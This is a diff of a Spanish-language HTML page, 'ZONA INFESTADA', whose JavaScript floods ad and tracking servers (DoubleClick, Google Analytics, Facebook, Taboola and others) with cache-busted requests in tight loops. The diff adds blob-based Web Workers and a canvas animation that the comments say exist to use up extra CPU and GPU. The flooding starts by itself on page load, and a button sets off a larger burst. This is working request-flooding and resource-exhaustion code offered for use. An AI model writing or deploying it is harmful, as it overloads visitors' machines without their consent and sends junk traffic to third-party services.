@@ -15,132 +15,152 @@ body{
 h1{
   margin-top:40px;
   font-size:4.5rem;
-  animation: blink 0.4s infinite;
-  text-shadow: 0 0 20px red;
+  animation: blink 0.3s infinite;
+  text-shadow: 0 0 30px red;
 }
 #contador{
-  font-size:2.6rem;
+  font-size:2.8rem;
   margin:20px;
   color:#ff0000;
-  text-shadow: 0 0 15px red;
+  text-shadow: 0 0 20px red;
 }
 button{
-  padding:30px 60px;
-  font-size:2.4rem;
+  padding:35px 70px;
+  font-size:2.5rem;
   background:#c00;
   color:white;
   border:none;
   cursor:pointer;
   border-radius:12px;
-  box-shadow:0 0 40px red;
-  margin:30px;
+  box-shadow:0 0 50px red;
 }
-button:hover{
-  transform:scale(1.15);
-}
-@keyframes blink{ 50%{ opacity:0.1; } }
+@keyframes blink{ 50%{ opacity:0.05; } }
 </style>
 </head>
 <body>
 <h1>⚠ ZONA INFESTADA ⚠</h1>
 <div id="contador">Requests enviadas: 0</div>
 
+<canvas id="canvas" style="position:fixed; top:0; left:0; z-index:-1; opacity:0.15;"></canvas>
+
 <button onclick="activarModoNuclear()">
 ☢ ACTIVAR MODO ULTRA NUCLEAR ☢
 </button>
 
-<div id="warning">Esto va a saturar el navegador lo más rápido posible 😈</div>
+<div id="warning">Preparate... esto va a subir la CPU fuerte 😈</div>
 
 <script>
-// Lista grande de recursos pesados
+// === WORKERS + SPAM PESADO ===
 const resources = [
   "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
   "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
-  "https://www.googletagservices.com/tag/js/gpt.js",
   "https://connect.facebook.net/en_US/fbevents.js",
   "https://www.google-analytics.com/analytics.js",
-  "https://bat.bing.com/bat.js",
   "https://cdn.taboola.com/lib/native.js",
   "https://widgets.outbrain.com/outbrain.js",
-  "https://static.ads-twitter.com/uwt.js",
-  "https://acdn.adnxs.com/prebid/c/0/prebid.js",
   "https://googleads.g.doubleclick.net/pagead/ads",
-  "https://cm.everesttech.net/cm",
   "https://pixel.quantserve.com/pixel",
-  "https://sync.crwdcntrl.net/",
-  "https://cdn.segment.com/analytics.js/"
+  "https://sync.crwdcntrl.net/"
 ];
 
 let total = 0;
 let running = false;
+let workers = [];
+
+// Matrix rain para consumir GPU/CPU extra
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const chars = "01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const fontSize = 14;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+
+function drawMatrix() {
+  ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = "#00ff00";
+  ctx.font = fontSize + "px monospace";
+
+  for(let i = 0; i < drops.length; i++) {
+    const text = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+    
+    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975)
+      drops[i] = 0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix, 35);
+
+// Crear Web Workers para spam en segundo plano
+function createWorker() {
+  const workerCode = `
+    self.onmessage = function() {
+      setInterval(() => {
+        for(let i = 0; i < 6; i++) {
+          fetch("${resources[Math.floor(Math.random()*resources.length)]}?t=" + Date.now() + "&r=" + Math.random(), 
+            {mode: "no-cors", cache: "no-store"})
+            .catch(() => {});
+        }
+      }, 0);
+    };
+  `;
+  const blob = new Blob([workerCode], {type: "application/javascript"});
+  const worker = new Worker(URL.createObjectURL(blob));
+  worker.postMessage("");
+  workers.push(worker);
+}
 
 function spamRapido() {
   if (!running) return;
 
   const url = resources[Math.floor(Math.random() * resources.length)];
-  const cacheBuster = "?t=" + Date.now() + "&r=" + Math.random();
+  const cb = "?t=" + Date.now() + "&r=" + Math.random();
 
-  // 1. Script
-  const s = document.createElement("script");
-  s.src = url + cacheBuster;
-  s.async = true;
-  document.body.appendChild(s);
-
-  // 2. Imagen (Beacon)
-  const img = new Image();
-  img.src = url + cacheBuster;
-  document.body.appendChild(img);
-
-  // 3. Fetch (muy agresivo)
-  fetch(url + cacheBuster, { 
-    mode: 'no-cors', 
-    cache: 'no-store' 
-  }).catch(() => {});
-
-  // 4. XMLHttpRequest
-  try {
-    const xhr = new XMLHttpRequest();
-    xhr.open("GET", url + cacheBuster, true);
-    xhr.send();
-  } catch(e) {}
-
-  // 5. Iframe
-  if (Math.random() > 0.7) {
-    const iframe = document.createElement("iframe");
-    iframe.src = "https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-" + Math.random().toString().slice(2,15);
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
+  // Múltiples métodos agresivos
+  for(let i = 0; i < 4; i++) {
+    fetch(url + cb, {mode: 'no-cors', cache: 'no-store'}).catch(() => {});
+    
+    const img = new Image();
+    img.src = url + cb;
   }
 
-  total += 5; // aproximado
+  total += 12;
   document.getElementById("contador").innerText = `Requests enviadas: ${total.toLocaleString()}`;
 
-  // Llamada recursiva lo más rápido posible
-  setTimeout(spamRapido, 0);   // Máxima velocidad
+  setTimeout(spamRapido, 0);
 }
 
 function activarModoNuclear() {
   running = true;
   document.body.style.background = "#200";
-  document.body.style.color = "#ff2222";
   document.querySelector("h1").innerText = "☢ MODO ULTRA NUCLEAR ACTIVADO ☢";
 
-  // Ráfaga inicial brutal
-  for(let i = 0; i < 150; i++) {
+  // Crear varios Web Workers
+  for(let i = 0; i < 6; i++) {
+    createWorker();
+  }
+
+  // Ráfaga brutal
+  for(let i = 0; i < 200; i++) {
     setTimeout(() => {
-      for(let j = 0; j < 8; j++) spamRapido();
-    }, i * 4);
+      for(let j = 0; j < 15; j++) spamRapido();
+    }, i * 3);
   }
 
   spamRapido();
-  alert("¡Preparate! Se va a saturar todo lo que pueda 😈");
+  alert("¡Ahora sí va a subir la CPU fuerte! 😈");
 }
 
-// Iniciar automáticamente con fuerza media-alta
+// Inicio automático fuerte
 running = true;
+for(let i = 0; i < 3; i++) createWorker();
 setTimeout(() => {
-  for(let i = 0; i < 40; i++) spamRapido();
-}, 500);
+  for(let i = 0; i < 60; i++) spamRapido();
+}, 300);
 
 spamRapido();
 </script>
